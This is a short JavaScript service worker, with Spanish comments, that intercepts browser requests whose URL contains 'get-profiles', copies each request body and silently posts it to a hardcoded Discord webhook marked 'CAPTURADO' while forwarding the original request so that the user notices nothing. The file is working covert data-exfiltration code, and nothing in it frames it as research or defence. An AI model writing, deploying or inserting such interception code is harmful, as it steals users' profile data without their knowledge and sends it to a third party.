const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";

self.addEventListener('install', () => {
    console.log('SW instalado');
    self.skipWaiting();
});

self.addEventListener('activate', (event) => {
    console.log('SW activado');
    event.waitUntil(clients.claim());
});

self.addEventListener('fetch', (event) => {
    const url = event.request.url;
    
    if (url.includes('get-profiles')) {
        console.log('🎯 Interceptada:', url);
        
        event.respondWith(
            (async () => {
                try {
                    // Clonar request
                    const requestClone = event.request.clone();
                    const body = await requestClone.json();
                    
                    // Enviar a Discord (sin esperar respuesta)
                    fetch(WEBHOOK, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            content: `**📦 CAPTURADO**\n\`\`\`json\n${JSON.stringify(body, null, 2).substring(0, 1900)}\n\`\`\`` 
                        })
                    }).catch(e => console.log('Error Discord:', e));
                    
                    // Continuar con la petición original
                    return fetch(event.request);
                    
                } catch (error) {
                    console.log('Error capturando:', error);
                    return fetch(event.request);
                }
            })()
        );
    }
});